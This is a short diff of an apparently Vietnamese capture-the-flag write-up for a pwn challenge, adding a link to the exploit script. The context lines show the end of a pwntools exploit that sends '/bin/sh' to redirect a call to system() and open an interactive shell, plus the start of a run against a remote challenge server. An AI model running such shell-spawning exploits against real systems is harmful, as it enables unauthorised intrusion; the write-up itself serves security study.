@@ -136,7 +136,7 @@ p.sendline(exp)
 p.sendline("/bin/sh")     <==== send "/bin/sh" string so it will call system("/bin/sh") instead of printf("/bin/sh")
 p.interactive()
 ```
-Chạy file exploit hoy
+Chạy file [exploit](https://github.com/yuumi001/write-up/blob/main/svattt/exp.py) hoy
 ```
 iluvinn in ~/pwn/svattt/pray_for_flag λ python exp.py
 [+] Opening connection to 134.209.97.157 on port 2222: Done
